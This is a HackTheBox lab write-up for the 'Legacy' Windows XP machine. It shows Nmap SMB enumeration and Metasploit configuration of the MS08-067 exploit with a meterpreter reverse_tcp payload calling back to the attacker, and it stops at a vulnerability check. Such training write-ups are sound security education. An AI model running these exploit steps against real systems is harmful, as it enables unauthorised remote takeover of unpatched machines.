HackTheBox: Legacy

Windows XP Legacy Easy MS08-067

Step 1: Service Enumeration

Initial Nmap scan reveals open SMB ports on a Windows XP machine:

[msf] >> db_nmap legacy.htb
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Version scan reveals Windows XP Service Pack 3:

[msf] >> db_nmap -sVC -p135,139,445 legacy.htb
445/tcp open  microsoft-ds Windows XP microsoft-ds
Host script results:
| smb-os-discovery: Windows XP (Windows 2000 LAN Manager)
| smb-security-mode: message_signing: disabled (dangerous, but default)
Windows XP is highly vulnerable with multiple known exploits, especially MS08-067.

Step 2: Vulnerability Identification

Searching for MS08-067 exploit module in Metasploit:

[msf] >> search ms08

Matching Modules
================
  #  Name                                      Disclosure Date
  0  exploit/windows/smb/ms08_067_netapi      2008-10-28
  1  exploit/windows/smb/smb_relay            2001-03-31

The MS08-067 vulnerability is a critical remote code execution flaw in the Server Service on Windows systems.

Step 3: Exploit Configuration

[msf] >> use exploit/windows/smb/ms08_067_netapi
[msf] >> set RHOSTS legacy.htb
RHOSTS => legacy.htb
[msf] >> set LHOST tun0
LHOST => 10.10.14.5
[msf] >> set PAYLOAD windows/meterpreter/reverse_tcp
[msf] >> check
[+] 10.10.10.4:445 - The target is vulnerable.

Key Takeaways

  • MS08-067 (NetAPI) - Critical RCE vulnerability in Windows Server Service
  • Windows XP - End-of-life OS with unpatched vulnerabilities
  • SYSTEM Access - Highest privilege level on Windows
  • SMB Exploitation - Classic Windows lateral movement vector

This machine demonstrates the importance of keeping systems updated and retiring end-of-life operating systems.
